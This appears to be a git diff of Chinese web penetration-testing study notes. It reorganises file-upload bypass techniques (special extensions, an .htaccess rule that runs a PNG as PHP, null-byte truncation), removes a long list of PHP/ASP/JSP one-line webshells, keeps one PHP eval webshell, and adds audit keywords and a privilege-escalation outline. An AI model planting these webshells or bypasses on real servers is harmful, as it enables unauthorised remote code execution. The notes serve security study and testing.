@@ -27,11 +27,8 @@
       - [堆叠注入](#堆叠注入)
       - [WAF绕过注入](#waf绕过注入)
   - [文件上传漏洞](#文件上传漏洞)
-    - [客户端](#客户端)
-    - [服务端](#服务端)
     - [漏洞](#漏洞)
     - [waf绕过](#waf绕过)
-    - [一句话木马大全](#一句话木马大全)
   - [XSS跨站脚本漏洞](#xss跨站脚本漏洞)
     - [持久型](#持久型)
       - [绕过](#绕过)
@@ -68,6 +65,8 @@
   - [APP应用](#app应用)
   - [服务协议](#服务协议)
 - [WAF绕过](#waf绕过-1)
+- [代码审计](#代码审计)
+  - [漏洞关键字](#漏洞关键字)
 
 <!-- /code_chunk_output -->
 
@@ -267,30 +266,54 @@ https://github.com/ADOOO/DnslogSqlinj
 
 ### 文件上传漏洞
 
-![alt text](image.png)
+- 客户端
+  - js检查：
+  本地禁用JavaScript（前端检测）
+  burp抓包（发送往服务器）
+  复制前端代码，编辑后本地运行
+- 服务端
+  - 检查后缀
+    - 黑名单
+      1. 上传特殊可解析后缀：
+      用.phtml .phps .php5 .pht进行绕过
+      条件：在apache的httpd.conf中有如下配置代码：AddType
+      application/x-httpd-php .php .phtml .phps .php5 .pht
+      2. 上传.htacess：
+      创建一个.htaccess文件，里面写上
+      <FilesMatch "4.png">
+      SetHandler application/x-httpd-php
+      这串代码的意思是如果文件中有一个4.png的文件，他就会被解析为.php
+      条件：AllowOverride all且文件名字不被修改
+      3. 后缀大小写，点，空着，::$$DARA，双后缀名绕过
+      4. 配合解析漏洞
+        - Apache陌生后缀解析漏洞
+        - Apache换行解析漏洞
+    - 白名单
+     1. MIME绕过
+     2. %00，0x00截断
+  - 检查内容
+    1. 文件头检查
+    2. 突破getiamgesize()
+    3. 突破exif_imagetype()
+    4. 二次渲染
+  - 代码逻辑
+    1. 条件竞争
 
-![alt text](image-1.png)
-#### 客户端
-- 本地禁用JavaScript（前端检测）
-- burp抓包（发送往服务器）
-- 复制前端代码，编辑后本地运行
+上传文件
+- 返回文件速度
+  - 快，为客户端检查
+  - 慢，服务端检查  -是否可以上传图片后缀的非图片文件
+    - 是，检查后缀  -是否可以上传任意后缀
+      - 是，黑名单
+      - 否，白名单
+    - 否，检查内容（或逻辑）  -上传后图片大小，颜色，md5是否变化
+      - 是，重新渲染
+      - 否，只读取内容
 
-#### 服务端
-**黑名单**
-大小写，空格,点，::$$DARA，双后缀名绕过，特殊解析后缀，.htaccess解析，配合解析漏洞
-- **特殊解析后缀**：用.phtml .phps .php5 .pht进行绕过
-条件：在apache的httpd.conf中有如下配置代码：AddType application/x-httpd-php .php .phtml .phps .php5 .pht
-- **.htaccess解析**：创建一个.htaccess文件，里面写上<FilesMatch "4.png">
-SetHandler application/x-httpd-php
-这串代码的意思是如果文件中有一个4.png的文件，他就会被解析为.php
-条件：AllowOverride all且文件名字不被修改
-**白名单**
-MIME绕过，%00，0x00，0x0a截断
-- %00只能用于php版本低于5.3的
-**内容及其他**
-文件头检测，二次渲染，条件竞争，突破getimagesize，突破exif_imagetype
-- **条件竞争**：move_uploaded_file($temp_file,$upload_file)
-- move_uploaded_file()有这么一个特性，会忽略掉文件末尾的 /.
+%00只能用于php版本低于5.3的
+**条件竞争**：move_uploaded_file( $temp_file,$upload_file)
+move_uploaded_file()有这么一个特性，会忽略掉文件末尾的 /.
+
 #### 漏洞
 **解析漏洞**
 IIS6/7.x，Apache，Nginx
@@ -309,97 +332,9 @@ IIS6/7.x，Apache，Nginx
 
 重复数据-防匹配(参数多次)
 - filename="a.jpg"filename="a.jpg"filename="a.jpg"...filename="a.php"
-#### 一句话木马大全
-```
-##PHP：
+
+一句话木马
 <?php @eval($_POST['r00ts']);?> 
-<?php phpinfo();?>
-<?php @eval($_POST[cmd]);?>
-<?php @eval($_REQUEST[cmd]);?>
-<?php assert($_REQUEST[cmd]); ?>
-<?php //?cmd=phpinfo() @preg_replace("/abc/e",$_REQUEST['cmd'],"abcd"); ?>
-<?php 
-//?cmd=phpinfo();
-$func =create_function('',$_REQUEST['cmd']);
-$func();
-?>
-
-<?php
-//?func=system&cmd=whoami
-$func=$_GET['func'];
-$cmd=$_GET['cmd'];
-$array[0]=$cmd;
-$new_array=array_map($func,$array);
-//print_r($new_array);
-?>
-
-<?php 
-//?cmd=phpinfo()
-@call_user_func(assert,$_GET['cmd']);
-?>
-
-<?php 
-//?cmd=phpinfo()
-$cmd=$_GET['cmd'];
-$array[0]=$cmd;
-call_user_func_array("assert",$array);
-?>
-
-<?php 
-//?func=system&cmd=whoami
-$cmd=$_GET['cmd'];
-$array1=array($cmd);
-$func =$_GET['func'];
-array_filter($array1,$func);
-?>
-
-<?php usort($_GET,'asse'.'rt');?> php环境>=<5.6才能用
-<?php usort(...$_GET);?>  php环境>=5.6才能用
-<?php eval($_POST1);?> 
-<?php if(isset($_POST['c'])){eval($_POST['c']);}?> 
-<?php system($_REQUEST1);?> 
-<?php ($_=@$_GET1).@$_($_POST1)?> 
-<?php eval_r($_POST1)?> 
-<?php @eval_r($_POST1)?>//容错代码 
-<?php assert($_POST1);?>//使用Lanker一句话客户端的专家模式执行相关的PHP语句 
-<?$_POST['c']($_POST['cc']);?> 
-<?$_POST['c']($_POST['cc'],$_POST['cc'])?> 
-<?php @preg_replace("/[email]/e",$_POST['h'],"error");?>/*使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入*/:<O>h=@eval_r($_POST1);</O> 
-<?php echo `$_GET['r']` ?> 
-
-<script language="php">@eval_r($_POST[sb])</script> //绕过<?限制的一句话
-
-<?php (])?>   上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如 index.asp里面也是可以的！
-
-<?if(isset($_POST['1'])){eval($_POST['1']);}?><?php system ($_REQUEST[1]);?> 
-加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件 的最底部不会出错！
-
-<%execute request(“class”)%><%'<% loop <%:%><%'<% loop <%:%><%execute request (“class”)%><%execute request(“class”)'<% loop <%:%> 
-无防下载表，有防下载表可尝试插入以下语句突破的一句话 
-
-<%eval(request(“1″)):response.end%> 备份专用
-
-##JSP：
-<%if(request.getParameter("f")!=null)(newjava.io.FileOutputStream (application.getRealPath("\\")+request.getParameter("f"))).write (request.getParameter("t").getBytes());%> 
-提交客户端 
-<form action="" method="post"><textareaname="t"></textarea><br/><input type="submit"value="提交"></form>
-
-##ASP
-<%eval(Request.Item["r00ts"],”unsafe”);%>
-
-<%IfRequest(“1″)<>”"ThenExecuteGlobal(Request(“1″))%> 
-
-<%execute(request(“1″))%> 
-
-<scriptrunat=server>execute request(“1″)</script> 不用'<,>‘的asp一句话 
-
-##aspx
-<scriptrunat=”server”>WebAdmin2Y.x.y aaaaa =newWebAdmin2Y.x.y (“add6bb58e139be10″);</script> 
-
-<script language="C#"runat="server">WebAdmin2Y.x.y a=new WebAdmin2Y.x.y("add6bb58e139be10")</script> 
-
-<%eval request(chr(35))%>  不用双引号的一句话。
-```
 
 
 
@@ -774,4 +709,88 @@ API接口：wsdl，awvs
 **漏洞利用**
 
 **权限控制**
+- 脚本：ASP，PHP，jsp，aspx，py，war
+- 工具：菜刀，蚁剑，冰蝎
+- 代码：加密混淆，变量覆盖，异或生成
+- 行为：指纹变异，自写轮子
+- 检测：常规安全脚本工具使用
 
+
+
+## 代码审计
+- 语言：PHP，JAVA
+- 框架：无框架，有框架
+- 漏洞：sql注入，文件上传，XSS狂战，RCE执行，文件包含，反序列化，其他漏洞
+- 案例：demo段，完整源码，框架源码
+- 技巧：随机挖掘，定点挖掘，批量挖掘
+- 工具：RIPS，Fortify，Seay系统
+
+### 漏洞关键字
+- sql注入：
+  select，insert，update，mysql_query,mysqli
+- 文件上传：
+  $_FILES,type="file",上传,move_uploaded_file()
+- xss跨站：
+  print,print_r,echo,sprintf,die,var_dump,var_export
+- 文件包含：
+  include,include_once,require,require_once
+- 代码执行：
+eval,assert,preg_replace,call_user_func,call_user_func_array
+- 命令执行：
+  system,exec,shell_exec,``,passthru,pcntl_exec,popen,proc_open
+- 变量覆盖：
+  extract(),parse_str,importrequestvariables(),$$
+- 反序列化：
+  serialize(),unserialize(),_construct,_destruct
+- 其他漏洞：
+  unlink(),file_get_contents(),show_source(),file(),fopen()
+- 通用关键字：
+  $_GET,$_POST,$_REQUEST,$_FILES,$_SERVER
+
+
+## 权限提升
+
+- Webshell
+  - 后台
+    - 功能点
+      - 文件上传
+      - 模板修改
+      - SQL执行
+      - 数据备份
+    - 思路点
+      - 已知程序
+        - 网上资料
+        - 代码审计
+      - 未知程序
+        - 找功能点
+  - 漏洞
+    - 单点漏洞
+    - 组合漏洞
+  - 第三方
+    - 编辑器
+    - 中间件
+    - phpmyadmin
+- 其他权限
+  - 数据库
+  - 服务类
+    - FTP
+    - RDP
+    - SSH
+  - 第三方接口
+    - 邮件
+    - 支付
+    - 空间商
+- 服务器系统
+  - windows
+    - 针对环境 
+      - web
+      - 本地
+    - 提权方法
+      - 数据库，溢出漏洞，令牌窃取，第三方软件，AT&SC&PS，不安全的服务权限，不带引号的服务路径，Unattended installs，AlwaysinstallElevated
+    - 针对版本
+  - linux
+
+ 信息收集-补丁筛选-利用MSF或EXP-执行
+ **工具**
+ Windows：Wes，WindowsVulnScan，
+ Linux：Vulmap
